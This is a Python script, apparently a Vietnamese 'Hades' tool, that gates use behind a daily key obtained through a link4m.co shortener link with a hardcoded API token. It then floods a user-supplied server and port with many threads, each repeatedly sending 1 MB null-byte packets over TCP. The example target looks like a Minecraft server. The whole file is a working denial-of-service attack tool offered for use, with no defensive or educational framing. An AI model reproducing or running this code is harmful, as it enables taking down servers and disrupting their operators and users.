# Nguồn: Hades
import socket
import threading
import time
import os
import json
import requests 
from time import strftime
from datetime import datetime, timedelta


KEY_FILE = 'key.json'


if os.name == 'nt':
    import ctypes
    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)


class xColor:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    RESET = "\033[0m"


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def save_key(key_value, date_saved):
    data = {'key': key_value, 'date': date_saved}
    with open(KEY_FILE, 'w') as f:
        json.dump(data, f)


def load_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, 'r') as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return None 
    return None


def get_and_validate_key():
    today = datetime.now().day
    current_date_str = datetime.now().strftime('%Y-%m-%d')
    generated_key = str(today * 25937 + 469173)

    saved_key_data = load_key()

    if saved_key_data:
        saved_key = saved_key_data.get('key')
        key_date_str = saved_key_data.get('date')

        
        if saved_key == generated_key and key_date_str == current_date_str:
            print(f"{xColor.GREEN}Key đã lưu hợp lệ cho hôm nay. Tiếp tục...\x1b[0m")
            return generated_key
        else:
            print(f"{xColor.YELLOW}Key đã lưu hết hạn hoặc không đúng cho hôm nay. Cần nhập lại key.\x1b[0m")
    
    
    while True:
        url_for_key_retrieval = f'https://hadeszinh.fwh.is/getkey.php?key={generated_key}'
        token_link4m = "67f68d4d48b525538e5d0b55" 
        api_endpoint_link4m = "https://link4m.co/api-shorten/v2"
        link_key = "Không lấy được key"

        try:
            print("\x1b[96mĐang thử lấy link key bằng phương thức GET...\x1b[0m")
            response_get = requests.get(api_endpoint_link4m, params={'api': token_link4m, 'url': url_for_key_retrieval})
            response_get.raise_for_status()

            post_url_get_json = response_get.json()

            if post_url_get_json.get('status') == "success":
                link_key = post_url_get_json['shortenedUrl']
                print("\x1b[92mĐã lấy link key thành công bằng GET!\x1b[0m")
            else:
                print(f"\x1b[91mLỗi khi rút gọn link (GET): {post_url_get_json.get('message', 'Không rõ lỗi')}\x1b[0m")
                print("\x1b[93mThử lại với phương thức POST...\x1b[0m")

                headers = {'Content-Type': 'application/json'}
                payload = {'api': token_link4m, 'url': url_for_key_retrieval}
                
                response_post = requests.post(api_endpoint_link4m, json=payload)
                response_post.raise_for_status()

                post_url_post_json = response_post.json()

                if post_url_post_json.get('status') == "success":
                    link_key = post_url_post_json['shortenedUrl']
                    print("\x1b[92mĐã lấy link key thành công bằng POST!\x1b[0m")
                else:
                    print(f"\x1b[91mLỗi khi rút gọn link (POST): {post_url_post_json.get('message', 'Không rõ lỗi')}\x1b[0m")
                    print(f"\x1b[93mPhản hồi đầy đủ từ API (POST):\n{post_url_post_json}\x1b[0m")
                    quit()

        except requests.exceptions.HTTPError as e:
            print(f"\x1b[91mLỗi HTTP khi gọi API link4m.co: {e}\x1b[0m")
            print(f"\x1b[93mPhản hồi HTTP thô:\n{e.response.text}\x1b[0m")
            quit()
        except requests.exceptions.RequestException as e:
            print(f"\x1b[91mLỗi kết nối đến link4m.co: {e}\x1b[0m")
            quit()
        except json.JSONDecodeError:
            print(f"\x1b[91mLỗi giải mã JSON từ phản hồi link4m.co. Có thể API không trả về JSON hợp lệ.\x1b[0m")
            if 'response_get' in locals():
                print(f"\x1b[93mPhản hồi thô (GET) từ link4m.co:\n{response_get.text}\x1b[0m")
            elif 'response_post' in locals():
                print(f"\x1b[93mPhản hồi thô (POST) từ link4m.co:\n{response_post.text}\x1b[0m")
            else:
                print("\x1b[93mKhông có phản hồi thô để hiển thị.\x1b[0m")
            quit()
        except Exception as e:
            print(f"\x1b[91mĐã xảy ra lỗi không mong muốn trong quá trình lấy key: {e}\x1b[0m")
            quit()
        
        # Yêu cầu người dùng nhập key
        nhap_key = input(f'''\x1b[1;32m Link lấy key: \x1b[1;33m{link_key}
    \x1b[1;36m      __  __            __        
    \x1b[1;36m   / / / /___ _____/ /__  _____
    \x1b[1;36m  / /_/ / __ / __  / _ \\/ ___/
    \x1b[1;36m / __  / /_/ / /_/ /  __(__  ) 
    \x1b[1;36m/_/ /_/\\__,_/\\__,_/\\___/____/  
    \x1b[1;97m                             
            \x1b[1;34m[-----------------------------]
            \x1b[1;31m1.Support TooL:Hades .
            \x1b[1;36m4. https://www.facebook.com/buitrangiavinh
            \x1b[1;34m[-----------------------------]
                  \x1b[1;32m KeyTooLHôm Nay: \x1b[1;33m''')

        if nhap_key == generated_key:
            print('\x1b[1;32m Key chính xác. Chúc Bạn Ngày Tốt Lành!\x1b[0m')
            save_key(generated_key, current_date_str) 
            time.sleep(2) 
            clear_screen() 
            return generated_key
        else:
            print('\x1b[1;31m Key Sai. Vui lòng thử lại hoặc vượt link để lấy key mới.\x1b[0m')
            time.sleep(2)
            clear_screen() 


# Lấy và xác thực key
validated_key = get_and_validate_key()

ascii_art = """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣷⣜⢿⣧⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠻⣿⣿⣿⣿⣦⠄⠄
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣮⡻⣷⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣆⠙⣿⣿⣿⣿⣧⠄
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣿⣿⣿⣿⣿⣿⣧⢸⣿⣿⣿⡘⢿⣮⡛⣷⡙⢿⣿⡏⢻⣿⣿⣿⣧⠙⢿⣿⣿⣷⠘⢿⣿⣆⢿⣿⣿⣿⣿⣆
⣿⣿⣿⣿⣿⣿⣿⣿⡿⠐⣿⣿⣿⣿⣿⣿⠃⠄⢣⠻⣿⣧⠄⠙⢷⡀⠙⢦⡙⢿⡄⠹⣿⣿⣿⣇⠄⠻⣿⣿⣇⠈⢻⣿⡎⢿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⣿⣿⣿⣿⣿⠋⠄⣼⣆⢧⠹⣿⣆⠄⠈⠛⣄⠄⢬⣒⠙⠂⠈⢿⣿⣿⡄⠄⠈⢿⣿⡀⠄⠙⣿⠘⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⣿⣿⣿⣿⠏⢀⣼⣿⣿⣎⠁⠐⢿⠆⠄⠄⠈⠢⠄⠙⢷⣤⡀⠄⠙⠿⠷⠄⠄⠄⠹⠇⠄⠄⠘⠄⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⢻⣿⣿⠏⢀⣾⣿⣿⣿⣿⡦⠄⠄⡘⢆⠄⠄⠄⠄⠄⠄⠙⠻⡄⠄⠄⠉⡆⠄⠄⠄⠑⠄⢠⡀⠄⠄⣿⡿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⢸⣿⠋⣰⣿⣿⡿⢟⣫⣵⣾⣷⡄⢻⣄⠁⠄⠄⠠⣄⠄⠄⠄⠈⠂⠄⠄⠈⠄⠱⠄⠄⠄⠄⢷⢀⣠⣽⡇⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢁⣚⣫⣭⣶⣾⣿⣿⣿⣿⣿⣿⣦⣽⣷⣄⠄⠄⠘⢷⣄⠄⠄⠄⠄⣠⠄⠄⠄⠄⠈⠉⠈⠻⢸⣿⣿⡇⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⢠⣾⣿⣿⣿⣿⣿⡿⠿⠿⠟⠛⠿⣿⣿⣿⣿⣷⣤⣤⣤⣿⣷⣶⡶⠋⢀⡠⡐⢒⢶⣝⢿⡟⣿⢸⣿⣿⡃⣿
⣿⣿⣿⢹⣿⢿⣿⣿⣷⢠⣿⣿⣿⣿⣯⠷⠐⠋⠋⠛⠉⠁⠛⠛⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⡏⠊⡼⢷⢱⣿⡾⡷⣿⢸⡏⣿⢰⣿
⣿⣿⣿⢸⣿⡘⡿⣿⣿⠎⣿⠟⠋⢁⡀⡠⣒⡤⠬⢭⣖⢝⢷⣶⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢃⢔⠭⢵⣣⣿⠓⢵⣿⢸⢃⡇⢸⣿
⣿⣿⣿⡄⣿⡇⠄⡘⣿⣷⡸⣴⣾⣿⢸⢱⢫⡞⣭⢻⡼⡏⣧⢿⣿⣿⣿⣿⣿⣿⣿⡿⣿⢿⡿⣿⣧⣕⣋⣉⣫⣵⣾⣿⡏⢸⠸⠁⢸⡏
⣿⣿⣿⡇⠸⣷⠄⠈⠘⢿⣧⠹⣹⣿⣸⡼⣜⢷⣕⣪⡼⣣⡟⣾⣿⣿⢯⡻⣟⢯⡻⣿⣮⣷⣝⢮⣻⣿⢿⣿⣝⣿⣿⢿⣿⢀⠁⠄⢸⠄
⣿⣿⡿⣇⠄⠹⡆⠄⠄⠈⠻⣧⠩⣊⣷⠝⠮⠕⠚⠓⠚⣩⣤⣝⢿⣿⣯⡿⣮⣷⣿⣾⣿⢻⣿⣿⣿⣾⣷⣽⣿⣿⣿⣿⡟⠄⠄⠄⠄⢸
⠹⣿⡇⢹⠄⠄⠐⠄⠄⠄⠄⠈⠣⠉⡻⣟⢿⣝⢿⣝⠿⡿⣷⣝⣷⣝⣿⣿⣿⣿⣿⣿⣿⣧⢹⣿⣿⣿⣿⣿⣿⣿⣿⡟⣠⠄⠄⠄⠄⠈
⠄⠘⠇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⣌⠈⢳⢝⣮⣻⣿⣿⣮⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⢀
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣷⣤⣝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠄⠄⠄⠄⣼
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⠏⠄⠄⠄⠄⣰⢩
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠋⠉⠉⠉⠄⠄⠄⠄⣸⣿⣿⣿⣿⡿⠃⠄⠄⠄⠄⣰⣿⣧
⣷⡀⠄⠈⢦⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣯⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣶⣶⣶⣶⣾⣿⣿⣿⣿⡿⠋⠄⠄⠄⠄⠄⣰⣿⣿⣿
⣿⣿⣦⡱⣌⢻⣦⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠄⠄⠄⠄⠄⠄⢰⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣷⣿⣿⣦⣐⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⡔⢀⣴⠄⠄⠄⡼⣠⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⠉⠉⠙⠛⢛⣛⣛⣭⣾⣿⣴⣿⢇⣤⣦⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
"""

# In 
print(ascii_art)

# Các hàm gốc giữ nguyên

def send_packet(server_ip, server_port, packet, packet_count, thread_id):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, server_port))
            for i in range(packet_count):
                s.sendall(packet)
            print(f"{xColor.GREEN}Thread {thread_id} đã gửi thành công {packet_count} gói tin.{xColor.RESET}")
    except Exception:
        pass

def stop_thread_after_timeout(thread, timeout):
    time.sleep(timeout)
    if thread.is_alive():
        print(f"{xColor.YELLOW}Thread {thread.name} (ID: {thread.ident}) đã hết {timeout}s giới hạn!{xColor.RESET}")

# --- Nhập dữ liệu
server_address = input(f"{xColor.CYAN}Nhập địa chỉ server (ví dụ: hades.pikamc.vn:15571): {xColor.RESET}")
server_ip, port_str = server_address.split(":")
server_port = int(port_str)

packet_count_input = input(f"{xColor.CYAN}Nhập số lượng gói tin mỗi luồng (mặc định: 50000): {xColor.RESET}")
packet_count = int(packet_count_input) if packet_count_input else 50000

timeout_input = input(f"{xColor.CYAN}Nhập thời gian giới hạn cho mỗi luồng (giây, mặc định: 5): {xColor.RESET}")
timeout_seconds = int(timeout_input) if timeout_input else 5

thread_count_input = input(f"{xColor.CYAN}Nhập số lượng luồng sẽ tạo: {xColor.RESET}")
thread_count = int(thread_count_input)


packet = b"\x00" * (1024 * 1024)

print(f"\n{xColor.GREEN}Bắt đầu tạo {thread_count} luồng...{xColor.RESET}")

threads = []
for i in range(thread_count):
    thread_name = f"Worker-{i+1}"
    thread = threading.Thread(target=send_packet, args=(server_ip, server_port, packet, packet_count, i+1), name=thread_name)
    threads.append(thread)
    thread.start()

    timer = threading.Thread(target=stop_thread_after_timeout, args=(thread, timeout_seconds))
    timer.start()

for thread in threads:
    thread.join()

print("\n" + "="*50)
print(f"{xColor.GREEN}Hoàn tất! Tất cả các luồng đã kết thúc nhiệm vụ.{xColor.RESET}")
print("="*50)
